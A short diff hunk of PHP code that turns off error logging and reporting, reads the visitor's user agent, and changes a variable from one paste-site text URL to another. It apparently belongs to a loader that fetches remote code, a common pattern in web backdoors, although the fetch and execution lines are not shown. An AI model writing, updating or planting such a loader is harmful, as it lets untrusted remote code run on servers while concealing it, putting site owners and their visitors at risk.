@@ -3,7 +3,7 @@
 @ini_set('log_errors', 0);
 error_reporting(0);
 
-$u = 'https://paste.myconan.net/592197.txt';
+$u = 'https://paste.myconan.net/592671.txt';
 $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Mozilla/5.0';
 $c = '';
 
